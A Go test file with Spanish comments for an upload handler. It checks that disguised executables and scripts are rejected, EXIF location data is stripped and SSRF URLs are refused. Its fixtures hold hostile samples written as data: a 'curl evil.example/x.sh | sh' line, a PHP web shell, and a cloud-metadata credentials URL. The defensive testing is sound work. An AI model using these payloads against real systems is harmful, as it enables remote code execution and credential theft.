package handlers

import (
	"bytes"
	"encoding/json"
	"image"
	"image/color"
	"image/jpeg"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"testing"

	"codex/backend/internal/config"
	"codex/backend/internal/media"
)

// subir arma una petición multipart con el nombre de archivo indicado y la
// ejecuta contra adminUpload, dentro de un directorio temporal.
func subir(t *testing.T, nombre string, contenido []byte) *httptest.ResponseRecorder {
	t.Helper()
	dir := t.TempDir()
	anterior, _ := os.Getwd()
	if err := os.Chdir(dir); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chdir(anterior) })

	var cuerpo bytes.Buffer
	w := multipart.NewWriter(&cuerpo)
	fw, err := w.CreateFormFile("file", nombre)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := fw.Write(contenido); err != nil {
		t.Fatal(err)
	}
	_ = w.Close()

	req := httptest.NewRequest(http.MethodPost, "/api/adm/upload", &cuerpo)
	req.Header.Set("Content-Type", w.FormDataContentType())

	h := &Handler{Cfg: &config.Config{Dominio: "https://codexpe.com"}}
	rec := httptest.NewRecorder()
	h.adminUpload(rec, req)
	return rec
}

// jpegConExif construye un JPEG real y le inserta un segmento APP1 (EXIF) con
// unas coordenadas dentro — igual que haría la cámara de un móvil.
func jpegConExif(t *testing.T, secreto string) []byte {
	t.Helper()
	m := image.NewRGBA(image.Rect(0, 0, 32, 32))
	for x := 0; x < 32; x++ {
		for y := 0; y < 32; y++ {
			m.Set(x, y, color.RGBA{uint8(x * 8), uint8(y * 8), 128, 255})
		}
	}
	var base bytes.Buffer
	if err := jpeg.Encode(&base, m, &jpeg.Options{Quality: 95}); err != nil {
		t.Fatal(err)
	}
	b := base.Bytes()

	// APP1 (0xFFE1) con la cabecera "Exif\0\0" y el secreto como carga.
	carga := append([]byte("Exif\x00\x00"), []byte(secreto)...)
	seg := []byte{0xFF, 0xE1, byte((len(carga) + 2) >> 8), byte((len(carga) + 2) & 0xff)}
	seg = append(seg, carga...)

	out := append([]byte{}, b[:2]...) // SOI
	out = append(out, seg...)
	return append(out, b[2:]...)
}

// EL CASO QUE IMPORTA: un ejecutable de Windows con nombre de imagen. Antes
// pasaba porque solo se miraba que la extensión fuese .png.
func TestAdminUpload_RechazaEjecutableConNombreDeImagen(t *testing.T) {
	exe := append([]byte("MZ\x90\x00\x03\x00\x00\x00"), bytes.Repeat([]byte{0x41}, 512)...)
	rec := subir(t, "foto-inocente.png", exe)

	if rec.Code != http.StatusUnsupportedMediaType {
		t.Fatalf("un ejecutable debe rechazarse con 415, dio %d: %s", rec.Code, rec.Body.String())
	}
	// El mensaje debe decir qué era en realidad, no un "no permitido" opaco.
	var resp map[string]string
	_ = json.Unmarshal(rec.Body.Bytes(), &resp)
	if resp["error"] == "" {
		t.Fatal("debería explicar el motivo del rechazo")
	}
	t.Logf("mensaje al usuario: %s", resp["error"])
}

func TestAdminUpload_RechazaScriptConNombreDeImagen(t *testing.T) {
	casos := map[string][]byte{
		"script.png": []byte("#!/bin/sh\ncurl evil.example/x.sh | sh\n"),
		"shell.jpg":  []byte("<?php system($_GET['cmd']); ?>"),
		"app.png":    []byte("import os\nos.system('id')\n"),
	}
	for nombre, contenido := range casos {
		rec := subir(t, nombre, contenido)
		if rec.Code != http.StatusUnsupportedMediaType {
			t.Errorf("%s: se esperaba 415, dio %d (%s)", nombre, rec.Code, rec.Body.String())
		}
	}
}

// Una imagen legítima sí debe entrar — y salir sin sus metadatos.
func TestAdminUpload_AceptaImagenYLeQuitaElExif(t *testing.T) {
	const secreto = "GPS 40.4168N 3.7038W CAMARA-DEL-DUENO"
	original := jpegConExif(t, secreto)
	if !bytes.Contains(original, []byte(secreto)) {
		t.Fatal("el JPEG de prueba debería llevar el EXIF")
	}

	dir := t.TempDir()
	anterior, _ := os.Getwd()
	if err := os.Chdir(dir); err != nil {
		t.Fatal(err)
	}
	defer func() { _ = os.Chdir(anterior) }()

	var cuerpo bytes.Buffer
	w := multipart.NewWriter(&cuerpo)
	fw, _ := w.CreateFormFile("file", "vacaciones.jpg")
	_, _ = fw.Write(original)
	_ = w.Close()

	req := httptest.NewRequest(http.MethodPost, "/api/adm/upload", &cuerpo)
	req.Header.Set("Content-Type", w.FormDataContentType())
	h := &Handler{Cfg: &config.Config{Dominio: "https://codexpe.com"}}
	rec := httptest.NewRecorder()
	h.adminUpload(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("una imagen válida debe aceptarse, dio %d: %s", rec.Code, rec.Body.String())
	}

	// Lo importante: el archivo guardado ya no contiene el EXIF.
	entradas, err := os.ReadDir(filepath.Join(dir, uploadDir))
	if err != nil || len(entradas) != 1 {
		t.Fatalf("se esperaba 1 archivo guardado, hay %d (%v)", len(entradas), err)
	}
	ruta := filepath.Join(dir, uploadDir, entradas[0].Name())
	guardado, err := os.ReadFile(ruta)
	if err != nil {
		t.Fatal(err)
	}
	if bytes.Contains(guardado, []byte(secreto)) {
		t.Fatal("el EXIF con las coordenadas sigue en la imagen publicada")
	}
	// Y sigue siendo una imagen válida.
	if m := media.Sniff(guardado); m != "image/jpeg" {
		t.Fatalf("el archivo guardado ya no es un JPEG válido: %q", m)
	}

	// Permisos sin bit de ejecución.
	info, err := os.Stat(ruta)
	if err != nil {
		t.Fatal(err)
	}
	if info.Mode().Perm()&0o111 != 0 {
		t.Fatalf("el archivo guardado tiene permiso de ejecución: %v", info.Mode().Perm())
	}
}

func TestAdminUpload_RechazaURLInterna(t *testing.T) {
	dir := t.TempDir()
	anterior, _ := os.Getwd()
	if err := os.Chdir(dir); err != nil {
		t.Fatal(err)
	}
	defer func() { _ = os.Chdir(anterior) }()

	// SSRF: se intenta que el servidor consulte los metadatos de la nube.
	var cuerpo bytes.Buffer
	w := multipart.NewWriter(&cuerpo)
	_ = w.WriteField("url", "https://169.254.169.254/latest/meta-data/iam/security-credentials/")
	_ = w.Close()

	req := httptest.NewRequest(http.MethodPost, "/api/adm/upload", &cuerpo)
	req.Header.Set("Content-Type", w.FormDataContentType())
	h := &Handler{Cfg: &config.Config{Dominio: "https://codexpe.com"}}
	rec := httptest.NewRecorder()
	h.adminUpload(rec, req)

	if rec.Code != http.StatusBadRequest {
		t.Fatalf("una URL interna debe rechazarse, dio %d: %s", rec.Code, rec.Body.String())
	}
	entradas, _ := os.ReadDir(filepath.Join(dir, uploadDir))
	if len(entradas) != 0 {
		t.Fatal("no debería haberse guardado ningún archivo")
	}
}

func TestAdminUpload_RechazaURLSinTLS(t *testing.T) {
	dir := t.TempDir()
	anterior, _ := os.Getwd()
	_ = os.Chdir(dir)
	defer func() { _ = os.Chdir(anterior) }()

	var cuerpo bytes.Buffer
	w := multipart.NewWriter(&cuerpo)
	_ = w.WriteField("url", "http://ejemplo.com/foto.jpg")
	_ = w.Close()

	req := httptest.NewRequest(http.MethodPost, "/api/adm/upload", &cuerpo)
	req.Header.Set("Content-Type", w.FormDataContentType())
	h := &Handler{Cfg: &config.Config{Dominio: "https://codexpe.com"}}
	rec := httptest.NewRecorder()
	h.adminUpload(rec, req)

	if rec.Code != http.StatusBadRequest {
		t.Fatalf("una URL http:// debe rechazarse, dio %d", rec.Code)
	}
}
